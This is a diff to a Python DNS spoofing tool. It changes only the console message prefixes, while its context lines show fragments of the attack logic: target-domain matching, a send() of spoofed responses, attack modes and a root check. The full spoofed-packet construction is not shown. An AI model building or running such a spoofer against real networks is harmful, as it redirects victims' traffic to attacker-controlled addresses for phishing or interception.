@@ -20,7 +20,7 @@ class DNSPoisoner:
             # Check if the query matches any target domain
             if any(target in qname for target in self.target_domains):
                 if self.mode != "silent":
-                    print("[+] Spoofing DNS response for {}".format(qname))
+                    print("+++ Spoofing DNS response for {}".format(qname))
 
                 # Construct spoofed DNS response
                 spoofed_pkt = (
@@ -39,12 +39,12 @@ class DNSPoisoner:
                 send(spoofed_pkt, verbose=0)
             else:
                 if self.mode == "aggressive":
-                    print("[-] Ignoring DNS query")
+                    print("--- Ignoring DNS query")
 
 
 # Register Ctrl+C handler
 def stop(sig, frame):
-    print("[!] Stopping DNS spoofer. Exiting.")
+    print("!!! - Stopping DNS spoofer. Exiting.")
     sys.exit(0)
 
 
@@ -59,12 +59,12 @@ def main():
     # Initialize DNSPoisoner instance
     poisoner = DNSPoisoner(args.spoof_ip, args.target_domains, args.mode)
 
-    print("[*] Starting DNS spoofing...")
+    print("... Starting DNS spoofing...")
     print("    Interface: {}".format(args.iface))
     print("    Target domains: {}".format(args.target_domains))
     print("    Spoof IP: {}".format(args.spoof_ip))
     print("    Mode: {}".format(args.mode))
-    print("[*] Press Ctrl+C to stop.\n")
+    print("*   Press Ctrl+C to stop.\n")
 
     signal.signal(signal.SIGINT, stop)
 
@@ -74,6 +74,6 @@ def main():
 
 if __name__ == "__main__":
     if os.geteuid() != 0:
-        print("[!] Please run this script as root.")
+        print("! Run script as root.")
         sys.exit(1)
     main()
